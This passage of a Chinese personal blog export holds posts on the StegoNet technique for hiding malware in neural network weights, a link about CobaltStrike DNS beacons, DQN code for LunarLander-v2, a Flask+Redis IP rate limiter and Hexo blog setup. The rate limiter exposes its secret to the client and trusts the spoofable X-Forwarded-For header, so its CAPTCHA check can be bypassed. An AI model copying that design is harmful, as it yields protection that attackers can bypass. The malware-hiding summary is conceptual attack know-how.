<li><p>value mapping：在小数位上替换相同或最相似的恶意代码片段值</p>
</li>
<li><p>sign mapping：符号匹配，根据正负号匹配0或1</p>
</li>
<li><p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210902112103.png" alt="20210902112103"></p>
</li>
</ul>
</li>
<li><p>2）触发方法（triggers）：</p>
<ul>
<li><p>Logits trigger：钥匙锁，只有当输入和记录中的完全匹配才会触发</p>
</li>
<li><p>rank trigger：根据logits各维度的大小，根据排序的来匹配触发条件，（只要排序满足即可，不要求值匹配）</p>
</li>
<li><p>fine-tuned trigger：在rank trigger上微调，使得同一图形的不同变种都可以触发</p>
</li>
<li><p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210902112204.png" alt="20210902112204"></p>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="四-实现："><a href="#四-实现：" class="headerlink" title="四 . 实现："></a>四 . 实现：</h3><ul>
<li>1）在本地服务器上创建DNN模型</li>
<li>2）将恶意代码作为StegoNet的payload</li>
<li>3）将恶意代码嵌入到DNN模型中，并使用棋盘式输入创建trigger</li>
<li>4）在DNN test阶段，利用不安全的反序列化来修改softmax函数，在softmax函数中添加恶意内联函数（用于创建triggers，提取并执行内联函数）</li>
<li>5）在另一台机器上传递并部署恶意DNN模型</li>
</ul>
<hr>
<h3 id="五-实验评估："><a href="#五-实验评估：" class="headerlink" title="五 . 实验评估："></a>五 . 实验评估：</h3><ul>
<li>1）Evasiveness（逃逸性）：验证了恶意模型躲避检测的能力</li>
<li>2）Robustness（鲁棒性）：验证了恶意代码的完整性</li>
<li>3）Reliability（可靠性）：验证了触发条件的稳定性</li>
</ul>
<hr>
<p>PS：问题</p>
<ul>
<li>sign-mapping按照序列表进行匹配正负号，为什么不直接将恶意代码写入序列表中</li>
<li>模型的匹配序列表保存在哪儿</li>
<li>文中提到的CVE，不安全的反序列化、softmax内联函数部分具体如何实现的没有说明，只是提了一下</li>
</ul>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>神经网络，恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike DNS Beacon</title>
    <url>/2021/10/28/cobaltstrike_dns/</url>
    <content><![CDATA[<hr>
<h3 id="CobaltStrike-DNS-Beacon利用DNS协议进行命令控制。"><a href="#CobaltStrike-DNS-Beacon利用DNS协议进行命令控制。" class="headerlink" title="CobaltStrike DNS Beacon利用DNS协议进行命令控制。"></a>CobaltStrike DNS Beacon利用DNS协议进行命令控制。</h3><hr>
<ul>
<li><a href="https://www.bianchengquan.com/article/399455.html">传送门 –&gt; 工具的使用 | CobaltStrike中DNS Beacon的使用</a><a id="more"></a>
</li>
</ul>
<hr>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>Deep Q Network(DQN)在LunarLander-v2上的应用</title>
    <url>/2021/12/08/dqn-LunarLander-v2/</url>
    <content><![CDATA[<p><strong>关于QLearning、为什么使用神经网络来决定智能体的动作选择以及如何更新神经网络在上一篇文章《Deep Q Network(DQN)在CartPole-v0上的应用》中已经解释过，不得不说，神经网络作为Q函数的确发挥了重要的作用，这一篇趁热打铁，我们玩另一款游戏在月球登陆，下面将给出DQN在LunarLander-v2上的应用的代码。</strong></p>
<a id="more"></a>

<hr>
<h2 id="DQN在LunarLander-v2-gym-上的应用"><a href="#DQN在LunarLander-v2-gym-上的应用" class="headerlink" title="DQN在LunarLander-v2(gym)上的应用"></a>DQN在LunarLander-v2(gym)上的应用</h2><p>首先看模型未训练前效果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn@master/vedio/20211209-103248.gif" alt="image"></p>
<p>对应的奖励如下所示，可以看到毫无policy可言，效果一塌糊涂：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reward_sum:-153.79</span><br><span class="line">reward_sum:-119.95</span><br><span class="line">reward_sum:-126.0</span><br><span class="line">reward_sum:-137.3</span><br></pre></td></tr></table></figure>
<hr>
<p>为了改善这个情况，接下来需要训练模型。</p>
<p>训练模型：</p>
<p>依赖环境：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">torch&#x3D;&#x3D;1.9.0</span><br><span class="line">gym&#x3D;&#x3D;0.21.0</span><br><span class="line">swig（通过conda安装）</span><br><span class="line">box2d-py&#x3D;&#x3D;2.3.8</span><br><span class="line">##如果不安装swig和box2d-py会报错无法加载LunarLander-v2</span><br></pre></td></tr></table></figure>
<p>main.py :（训练网络）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import gym</span><br><span class="line">import random</span><br><span class="line">import torch</span><br><span class="line">import numpy as np</span><br><span class="line">from collections import namedtuple, deque</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">%matplotlib inline</span><br><span class="line"></span><br><span class="line"># pytorch imports</span><br><span class="line">import torch</span><br><span class="line">import torch.nn as nn</span><br><span class="line">import torch.nn.functional as F</span><br><span class="line">import torch.optim as optim</span><br><span class="line"></span><br><span class="line">env &#x3D; gym.make(&#39;LunarLander-v2&#39;)</span><br><span class="line">env.seed(0)</span><br><span class="line">print(&#39;State shape: &#39;, env.observation_space.shape)</span><br><span class="line">print(&#39;Number of Actions: &#39;, env.action_space.n)</span><br><span class="line"></span><br><span class="line">class QNetwork(nn.Module):</span><br><span class="line">    &quot;&quot;&quot;Actor (Policy) Model.&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def __init__(self, state_size, action_size, seed, fc1_units&#x3D;64, fc2_units&#x3D;64):</span><br><span class="line">        &quot;&quot;&quot;Initialize parameters and build model.</span><br><span class="line">        Params</span><br><span class="line">        &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">            state_size (int): Dimension of each state</span><br><span class="line">            action_size (int): Dimension of each action</span><br><span class="line">            seed (int): Random seed</span><br><span class="line">            fc1_units (int): Number of nodes in first hidden layer</span><br><span class="line">            fc2_units (int): Number of nodes in second hidden layer</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        super(QNetwork, self).__init__()</span><br><span class="line">        self.seed &#x3D; torch.manual_seed(seed)</span><br><span class="line">        self.fc1 &#x3D; nn.Linear(state_size, fc1_units)</span><br><span class="line">        self.fc2 &#x3D; nn.Linear(fc1_units, fc2_units)</span><br><span class="line">        self.fc3 &#x3D; nn.Linear(fc2_units, action_size)</span><br><span class="line"></span><br><span class="line">    def forward(self, state):</span><br><span class="line">        &quot;&quot;&quot;Build a network that maps state -&gt; action values.&quot;&quot;&quot;</span><br><span class="line">        x &#x3D; F.relu(self.fc1(state))</span><br><span class="line">        x &#x3D; F.relu(self.fc2(x))</span><br><span class="line">        return self.fc3(x)</span><br><span class="line">    </span><br><span class="line"># Define the DQN hyperparameters</span><br><span class="line"></span><br><span class="line">BUFFER_SIZE &#x3D; int(1e5)  # replay buffer size</span><br><span class="line">BATCH_SIZE &#x3D; 64         # minibatch size</span><br><span class="line">GAMMA &#x3D; 0.99            # discount factor</span><br><span class="line">TAU &#x3D; 1e-3              # for soft update of target parameters</span><br><span class="line">LR &#x3D; 5e-4               # learning rate </span><br><span class="line">UPDATE_EVERY &#x3D; 4        # how often to update the network</span><br><span class="line"></span><br><span class="line"># Use GPU is possible else use CPU</span><br><span class="line">device &#x3D; torch.device(&quot;cuda:0&quot; if torch.cuda.is_available() else &quot;cpu&quot;)</span><br><span class="line"></span><br><span class="line">class Agent():</span><br><span class="line">    &quot;&quot;&quot;Interacts with and learns from the environment.&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def __init__(self, state_size, action_size, seed):</span><br><span class="line">        &quot;&quot;&quot;Initialize an Agent object.</span><br><span class="line">        </span><br><span class="line">        Params</span><br><span class="line">        &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">            state_size (int): dimension of each state</span><br><span class="line">            action_size (int): dimension of each action</span><br><span class="line">            seed (int): random seed</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        self.state_size &#x3D; state_size</span><br><span class="line">        self.action_size &#x3D; action_size</span><br><span class="line">        self.seed &#x3D; random.seed(seed)</span><br><span class="line"></span><br><span class="line">        # Q-Network</span><br><span class="line">        self.qnetwork_local &#x3D; QNetwork(state_size, action_size, seed).to(device)</span><br><span class="line">        self.qnetwork_target &#x3D; QNetwork(state_size, action_size, seed).to(device)</span><br><span class="line">        self.optimizer &#x3D; optim.Adam(self.qnetwork_local.parameters(), lr&#x3D;LR)</span><br><span class="line"></span><br><span class="line">        # Replay memory</span><br><span class="line">        self.memory &#x3D; ReplayBuffer(action_size, BUFFER_SIZE, BATCH_SIZE, seed)</span><br><span class="line">        # Initialize time step (for updating every UPDATE_EVERY steps)</span><br><span class="line">        self.t_step &#x3D; 0</span><br><span class="line">    </span><br><span class="line">    def step(self, state, action, reward, next_state, done):</span><br><span class="line">        # Save experience in replay memory</span><br><span class="line">        self.memory.add(state, action, reward, next_state, done)</span><br><span class="line">        </span><br><span class="line">        # Learn every UPDATE_EVERY time steps.</span><br><span class="line">        self.t_step &#x3D; (self.t_step + 1) % UPDATE_EVERY</span><br><span class="line">        if self.t_step &#x3D;&#x3D; 0:</span><br><span class="line">            # If enough samples are available in memory, get random subset and learn</span><br><span class="line">            if len(self.memory) &gt; BATCH_SIZE:</span><br><span class="line">                experiences &#x3D; self.memory.sample()</span><br><span class="line">                self.learn(experiences, GAMMA)</span><br><span class="line"></span><br><span class="line">    def act(self, state, eps&#x3D;0.):</span><br><span class="line">        &quot;&quot;&quot;Returns actions for given state as per current policy.</span><br><span class="line">        </span><br><span class="line">        Params</span><br><span class="line">        &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">            state (array_like): current state</span><br><span class="line">            eps (float): epsilon, for epsilon-greedy action selection</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        state &#x3D; torch.from_numpy(state).float().unsqueeze(0).to(device)</span><br><span class="line">        self.qnetwork_local.eval()</span><br><span class="line">        with torch.no_grad():</span><br><span class="line">            action_values &#x3D; self.qnetwork_local(state)</span><br><span class="line">        self.qnetwork_local.train()</span><br><span class="line"></span><br><span class="line">        # Epsilon-greedy action selection</span><br><span class="line">        if random.random() &gt; eps:</span><br><span class="line">            return np.argmax(action_values.cpu().data.numpy())</span><br><span class="line">        else:</span><br><span class="line">            return random.choice(np.arange(self.action_size))</span><br><span class="line"></span><br><span class="line">    def learn(self, experiences, gamma):</span><br><span class="line">        &quot;&quot;&quot;Update value parameters using given batch of experience tuples.</span><br><span class="line"></span><br><span class="line">        Params</span><br><span class="line">        &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">            experiences (Tuple[torch.Tensor]): tuple of (s, a, r, s&#39;, done) tuples </span><br><span class="line">            gamma (float): discount factor</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        states, actions, rewards, next_states, dones &#x3D; experiences</span><br><span class="line"></span><br><span class="line">        # Get max predicted Q values (for next states) from target model</span><br><span class="line">        Q_targets_next &#x3D; self.qnetwork_target(next_states).detach().max(1)[0].unsqueeze(1)</span><br><span class="line">        # Compute Q targets for current states </span><br><span class="line">        Q_targets &#x3D; rewards + (gamma * Q_targets_next * (1 - dones))</span><br><span class="line"></span><br><span class="line">        # Get expected Q values from local model</span><br><span class="line">        Q_expected &#x3D; self.qnetwork_local(states).gather(1, actions)</span><br><span class="line"></span><br><span class="line">        # Compute loss</span><br><span class="line">        loss &#x3D; F.mse_loss(Q_expected, Q_targets)</span><br><span class="line">        # Minimize the loss</span><br><span class="line">        self.optimizer.zero_grad()</span><br><span class="line">        loss.backward()</span><br><span class="line">        self.optimizer.step()</span><br><span class="line"></span><br><span class="line">        # ------------------- update target network ------------------- #</span><br><span class="line">        self.soft_update(self.qnetwork_local, self.qnetwork_target, TAU)                     </span><br><span class="line"></span><br><span class="line">    def soft_update(self, local_model, target_model, tau):</span><br><span class="line">        &quot;&quot;&quot;Soft update model parameters.</span><br><span class="line">        θ_target &#x3D; τ*θ_local + (1 - τ)*θ_target</span><br><span class="line"></span><br><span class="line">        Params</span><br><span class="line">        &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">            local_model (PyTorch model): weights will be copied from</span><br><span class="line">            target_model (PyTorch model): weights will be copied to</span><br><span class="line">            tau (float): interpolation parameter </span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        for target_param, local_param in zip(target_model.parameters(), local_model.parameters()):</span><br><span class="line">            target_param.data.copy_(tau*local_param.data + (1.0-tau)*target_param.data)</span><br><span class="line"></span><br><span class="line">class ReplayBuffer:</span><br><span class="line">    &quot;&quot;&quot;Fixed-size buffer to store experience tuples.&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def __init__(self, action_size, buffer_size, batch_size, seed):</span><br><span class="line">        &quot;&quot;&quot;Initialize a ReplayBuffer object.</span><br><span class="line"></span><br><span class="line">        Params</span><br><span class="line">        &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">            action_size (int): dimension of each action</span><br><span class="line">            buffer_size (int): maximum size of buffer</span><br><span class="line">            batch_size (int): size of each training batch</span><br><span class="line">            seed (int): random seed</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        self.action_size &#x3D; action_size</span><br><span class="line">        self.memory &#x3D; deque(maxlen&#x3D;buffer_size)  </span><br><span class="line">        self.batch_size &#x3D; batch_size</span><br><span class="line">        self.experience &#x3D; namedtuple(&quot;Experience&quot;, field_names&#x3D;[&quot;state&quot;, &quot;action&quot;, &quot;reward&quot;, &quot;next_state&quot;, &quot;done&quot;])</span><br><span class="line">        self.seed &#x3D; random.seed(seed)</span><br><span class="line">    </span><br><span class="line">    def add(self, state, action, reward, next_state, done):</span><br><span class="line">        &quot;&quot;&quot;Add a new experience to memory.&quot;&quot;&quot;</span><br><span class="line">        e &#x3D; self.experience(state, action, reward, next_state, done)</span><br><span class="line">        self.memory.append(e)</span><br><span class="line">    </span><br><span class="line">    def sample(self):</span><br><span class="line">        &quot;&quot;&quot;Randomly sample a batch of experiences from memory.&quot;&quot;&quot;</span><br><span class="line">        experiences &#x3D; random.sample(self.memory, k&#x3D;self.batch_size)</span><br><span class="line"></span><br><span class="line">        states &#x3D; torch.from_numpy(np.vstack([e.state for e in experiences if e is not None])).float().to(device)</span><br><span class="line">        actions &#x3D; torch.from_numpy(np.vstack([e.action for e in experiences if e is not None])).long().to(device)</span><br><span class="line">        rewards &#x3D; torch.from_numpy(np.vstack([e.reward for e in experiences if e is not None])).float().to(device)</span><br><span class="line">        next_states &#x3D; torch.from_numpy(np.vstack([e.next_state for e in experiences if e is not None])).float().to(device)</span><br><span class="line">        dones &#x3D; torch.from_numpy(np.vstack([e.done for e in experiences if e is not None]).astype(np.uint8)).float().to(device)</span><br><span class="line">  </span><br><span class="line">        return (states, actions, rewards, next_states, dones)</span><br><span class="line"></span><br><span class="line">    def __len__(self):</span><br><span class="line">        &quot;&quot;&quot;Return the current size of internal memory.&quot;&quot;&quot;</span><br><span class="line">        return len(self.memory)</span><br><span class="line">    </span><br><span class="line">agent &#x3D; Agent(state_size&#x3D;8, action_size&#x3D;4, seed&#x3D;0)</span><br><span class="line"></span><br><span class="line">def dqn(n_episodes&#x3D;4000, max_t&#x3D;1000, eps_start&#x3D;1.0, eps_end&#x3D;0.01, eps_decay&#x3D;0.995):</span><br><span class="line">    &quot;&quot;&quot;Deep Q-Learning.</span><br><span class="line">    </span><br><span class="line">    Params</span><br><span class="line">    &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">        n_episodes (int): maximum number of training episodes</span><br><span class="line">        max_t (int): maximum number of timesteps per episode</span><br><span class="line">        eps_start (float): starting value of epsilon, for epsilon-greedy action selection</span><br><span class="line">        eps_end (float): minimum value of epsilon</span><br><span class="line">        eps_decay (float): multiplicative factor (per episode) for decreasing epsilon</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    scores &#x3D; []                        # list containing scores from each episode</span><br><span class="line">    scores_window &#x3D; deque(maxlen&#x3D;100)  # last 100 scores</span><br><span class="line">    eps &#x3D; eps_start                    # initialize epsilon</span><br><span class="line">    for i_episode in range(1, n_episodes+1):</span><br><span class="line">        state &#x3D; env.reset()</span><br><span class="line">        score &#x3D; 0</span><br><span class="line">        for t in range(max_t):</span><br><span class="line">            action &#x3D; agent.act(state, eps)</span><br><span class="line">            next_state, reward, done, _ &#x3D; env.step(action)</span><br><span class="line">            agent.step(state, action, reward, next_state, done)</span><br><span class="line">            state &#x3D; next_state</span><br><span class="line">            score +&#x3D; reward</span><br><span class="line">            if done:</span><br><span class="line">                break </span><br><span class="line">        scores_window.append(score)       # save most recent score</span><br><span class="line">        scores.append(score)              # save most recent score</span><br><span class="line">        eps &#x3D; max(eps_end, eps_decay*eps) # decrease epsilon</span><br><span class="line">        print(&#39;\rEpisode &#123;&#125;\tAverage Score: &#123;:.2f&#125;&#39;.format(i_episode, np.mean(scores_window)), end&#x3D;&quot;&quot;)</span><br><span class="line">        if i_episode % 100 &#x3D;&#x3D; 0:</span><br><span class="line">            print(&#39;\rEpisode &#123;&#125;\tAverage Score: &#123;:.2f&#125;&#39;.format(i_episode, np.mean(scores_window)))</span><br><span class="line">        if np.mean(scores_window)&gt;&#x3D;250.0:</span><br><span class="line">            print(&#39;\nEnvironment solved in &#123;:d&#125; episodes!\tAverage Score: &#123;:.2f&#125;&#39;.format(i_episode-100, np.mean(scores_window)))</span><br><span class="line">            torch.save(agent.qnetwork_local.state_dict(), &#39;checkpoint_v2.pth&#39;)</span><br><span class="line">            break</span><br><span class="line">    return scores</span><br><span class="line"></span><br><span class="line">scores &#x3D; dqn()</span><br><span class="line"></span><br><span class="line"># plot the scores</span><br><span class="line">fig &#x3D; plt.figure()</span><br><span class="line">ax &#x3D; fig.add_subplot(111)</span><br><span class="line">plt.plot(np.arange(len(scores)), scores)</span><br><span class="line">plt.ylabel(&#39;Score&#39;)</span><br><span class="line">plt.xlabel(&#39;Episode #&#39;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>训练过程中终端输出如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20211209110316.png" alt="20211209110316"></p>
<p>可以看出在reward_mean大于250时程序停止，同时得到checkpoint_v2.pth文件，可用于测试训练的效果，测试代码如下所示：</p>
<p>test.py : （测试模型学习的效果）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from dqn_agent import Agent</span><br><span class="line">import torch</span><br><span class="line">import gym</span><br><span class="line"></span><br><span class="line">env &#x3D; gym.make(&#39;LunarLander-v2&#39;)</span><br><span class="line">env.seed(0)</span><br><span class="line">agent &#x3D; Agent(state_size&#x3D;8, action_size&#x3D;4, seed&#x3D;0)</span><br><span class="line">agent.qnetwork_local.load_state_dict(torch.load(&#39;.&#x2F;checkpoint_v2.pth&#39;))</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">  state &#x3D; env.reset()</span><br><span class="line">  episode_reward_sum &#x3D; 0</span><br><span class="line">  while True:</span><br><span class="line">    env.render()</span><br><span class="line">    action &#x3D; agent.act(state)</span><br><span class="line">    state, reward, done, _ &#x3D; env.step(action)</span><br><span class="line">    episode_reward_sum +&#x3D; reward </span><br><span class="line">    if done:</span><br><span class="line">      print(f&#39;reward_sum:&#123;round(episode_reward_sum, 2)&#125;&#39;)</span><br><span class="line">      break</span><br><span class="line"></span><br><span class="line">env.close()</span><br></pre></td></tr></table></figure>
<p>动画效果如下，测试的获得奖励情况在终端中有显示，如下:</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn@master/vedio/20211209-104435.gif" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reward_sum:253.87</span><br><span class="line">reward_sum:232.45</span><br><span class="line">reward_sum:277.11</span><br><span class="line">reward_sum:291.65</span><br></pre></td></tr></table></figure>
<p>jupyter代码在github上可以获取，<a href="https://github.com/wxt406611016/DQN-LunarLander-v2">点击传送至Github</a></p>
]]></content>
      <categories>
        <category>RL</category>
      </categories>
      <tags>
        <tag>Machine Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>flask+redis限制ip访问速率</title>
    <url>/2020/04/11/flask+redis-%E9%99%90%E5%88%B6ip%E8%AE%BF%E9%97%AE%E9%A2%91%E7%8E%87/</url>
    <content><![CDATA[<p><strong>上篇介绍了利用font-face进行反爬虫，这篇介绍另一种常见方法–验证码校验，对频繁访问的ip进行限制，强制要求验证码验证，验证成功方可继续访问。</strong></p>
<h2 id="1-限制逻辑-策略："><a href="#1-限制逻辑-策略：" class="headerlink" title="1.限制逻辑/策略："></a>1.限制逻辑/策略：</h2><ol>
<li>利用request.remote_addr获取客户端ip；</li>
<li>客户端访问时，服务器判断redis中是否有客户端ip；</li>
<li>若不存在，将客户端ip存入redis中，对应值设为1；若存在，客户端ip对应值+1；</li>
<li>若redis中客户端ip对应值在5分钟内&gt;5，即5分钟内访问页面超过5次，则视为恶意ip，跳转至验证码校验页面；</li>
<li>验证成功后，向后端请求过渡函数B，进行redis操作，B函数的功能为将验证成功的ip从redis中删除，删除后再重定向至开始页面；</li>
</ol>
<a id="more"></a>
<h2 id="2-代码实现限制逻辑："><a href="#2-代码实现限制逻辑：" class="headerlink" title="2.代码实现限制逻辑："></a>2.代码实现限制逻辑：</h2><p>后端代码如下，index()方法用于判断redis中是否存在客户端ip，以及ip对应值是否大于5：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])</span><br><span class="line">def index():</span><br><span class="line">    ip&#x3D;request.remote_addr</span><br><span class="line">    if(rs.exists(ip)):                                         #rs可操作redis</span><br><span class="line">        rs.setrange(ip,0,int(rs.get(ip))+1)</span><br><span class="line">    else:</span><br><span class="line">        rs.set(ip,1,ex&#x3D;300)                               #5分钟5次</span><br><span class="line">    if (int(rs.get(ip))&lt;6):</span><br><span class="line">        return render_template(&#39;index.html&#39;)           #正常返回</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&quot;antibot.html&quot;,ip&#x3D;ip,secret&#x3D;secret)    #返回验证码校验页面</span><br></pre></td></tr></table></figure>
<p>如果跳转至antibot.html(验证码校验页面)后，前端通过js对参数a进行base64加密，并带参数访问/mid页面，之所以要带参数，是为了在后端验证参数是否有效(即判断是否是通过验证码校验后跳转而来)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">......</span><br><span class="line">onSuccess: function() &#123;</span><br><span class="line">      document.getElementById(&#39;msg&#39;).innerHTML &#x3D; &#39;登录成功！&#39;</span><br><span class="line">      var a&#x3D;&quot;&#123;&#123;ip&#125;&#125;&quot;+&quot;&#123;&#123;secret&#125;&#125;&quot;                   &#x2F;&#x2F;secret是从后端传来的随机密钥</span><br><span class="line">      a&#x3D;window.btoa(a)                                 &#x2F;&#x2F;对变量a进行base64加密</span><br><span class="line">      window.location.href&#x3D;&quot;&#x2F;mid?id&#x3D;&quot;+a</span><br><span class="line">    &#125;,</span><br><span class="line">......</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>mid()方法用于通过验证码校验后，将ip从redis中删除，并重定向至开始页面：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;mid&#39;, methods&#x3D;[&#39;GET&#39;])</span><br><span class="line">def mid():</span><br><span class="line">    cmp&#x3D;request.args.get(&#39;id&#39;,&#39;0&#39;)</span><br><span class="line">    ip&#x3D;request.remote_addr</span><br><span class="line">    sec&#x3D;ip+secret                                                 #secret作为随机密钥进行加密</span><br><span class="line">    result&#x3D;base64.b64encode(sec.encode())</span><br><span class="line">    result&#x3D;str(result)[2:-1]</span><br><span class="line">    if(cmp&#x3D;&#x3D;result):                                            #判断前端js传来的参数是否有效</span><br><span class="line">        rs.delete(ip)</span><br><span class="line">    response &#x3D;  redirect(url_for(&#39;index&#39;))</span><br><span class="line">    return response    </span><br></pre></td></tr></table></figure>
<h2 id="3-效果展示："><a href="#3-效果展示：" class="headerlink" title="3.效果展示："></a>3.效果展示：</h2><p>打开flask项目，可以正常访问：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1ltMGtMUS5wbmc?x-oss-process=image/format,png" alt="正常访问"><br>刷新5次后，触发了限制ip策略，返回验证码校验界面：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA1LzA3L1ltMEZzZy5wbmc?x-oss-process=image/format,png" alt="返回验证码校验"><br>验证成功后，成功返回开始页面。从而实现了flask上用redis进行限制ip访问频率。</p>
<h2 id="PS-若设置反向代理需注意！！！"><a href="#PS-若设置反向代理需注意！！！" class="headerlink" title="PS:若设置反向代理需注意！！！"></a>PS:若设置反向代理需注意！！！</h2><p>如果设置了反向代理的话，request.remote_addr则不会返回客户端的真实ip。以nginx反向代理为例，客户想要访问服务器，实际请求路线是client-&gt;nginx-&gt;server，而request.remote_addr表示的是上一级ip，而server的上一级ip是nginx服务器的ip.</p>
<p>解决办法：以nginx为例，在配置文件中使用X-Forwarded-For，然后后端获取ip方式由 <code>ip=request.remote_addr</code>更改为<code>ip = request.headers.getlist(&quot;X-Forwarded-For&quot;)[0]</code> 即可。</p>
<p><a href="http://wxt123.top/">访问上图中我的web项目，点击链接即可，</a></p>
<h4 id="如有错误或建议，请在评论处指出！"><a href="#如有错误或建议，请在评论处指出！" class="headerlink" title="如有错误或建议，请在评论处指出！"></a>如有错误或建议，请在评论处指出！</h4>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>ip限制</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu下 github+hexo个人博客搭建</title>
    <url>/2019/02/07/github+hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="github-hexo搭建详细过程"><a href="#github-hexo搭建详细过程" class="headerlink" title="github+hexo搭建详细过程:"></a>github+hexo搭建详细过程:</h1><p>我的操作系统为ubuntu16.04,在搭建的过程中参考了网上很多例子,但都没有完全适合自己的,多多少少还是会碰到一些问题,下面将详细展现github+hexo的搭建过程.<br>tips:萌新一枚,有不足之处,还请指出,tks!!!</p>
<a id="more"></a>
<p><strong>在搭建个人博客之前需要先安装一些环境:</strong></p>
<h2 id="1-安装nvm"><a href="#1-安装nvm" class="headerlink" title="1.安装nvm"></a>1.安装nvm</h2><p>nvm是node的包版本控制工具,nvm的好处在于你可以找到各种你想要的node版本,这里我们选择安装稳定版的node.(如果选择终端命令apt-get install nodejs方法安装node,node的版本较低,在后续的搭建过程中可能会报错),所以这里建议先安装nvm.</p>
<p>代码安装nvm(git过程中可能速度缓慢,如果你会翻墙可以翻墙git,个人亲测,速度提升明显)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;creationix&#x2F;nvm.git ~&#x2F;.nvm &amp;&amp; cd ~&#x2F;.nvm &amp;&amp; git checkout &#96;git describe --abbrev&#x3D;0 --tags&#96;</span><br></pre></td></tr></table></figure>
<p>接下来我们编辑环境变量配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd </span><br><span class="line">vim .bashrc</span><br></pre></td></tr></table></figure>
<p>将<code>source ~/.nvm/nvm.sh. </code>添加到.bashrc中,然后保存退出<br>输入命令<code>source .bashrc</code> 将新增的nvm添加到系统中.<br>输入命令<code>nvm --version</code>  如果显示版本,则显示安装成功.</p>
<h2 id="2-安装node"><a href="#2-安装node" class="headerlink" title="2.安装node"></a>2.安装node</h2><p>安装完nvm接下来使用nvm安装node和npm,首先检查远程仓库的可选版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nvm ls-remote</span><br></pre></td></tr></table></figure>
<p>安装node的稳定版</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nvm install stable</span><br></pre></td></tr></table></figure>
<p>启用安装好的版本,并设置为默认版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nvm use node</span><br><span class="line">nvm alias default node</span><br></pre></td></tr></table></figure>

<h2 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3.安装hexo"></a>3.安装hexo</h2><p>如果nvm安装完成且成功配置好稳定版以后，就可以安装hexo了.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir blog       #创建一个文件夹,文件夹名自拟,本例中为blog</span><br><span class="line">hexo init blog </span><br><span class="line">cd blog         </span><br><span class="line">npm install </span><br><span class="line">npm update -g</span><br></pre></td></tr></table></figure>
<p>执行没有报错的话hexo应该就可以用了,在blog目录下输入以下命令.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g     # 生成静态界面</span><br><span class="line">hexo s     # 开启本地服务</span><br></pre></td></tr></table></figure>
<p>如果命令行结果如下则安装成功了,此时你可以crtl+鼠标点击命令行url进入该页面。<br><img src="https://s2.ax1x.com/2019/02/08/kNeniR.png" alt="测试安装成功"></p>
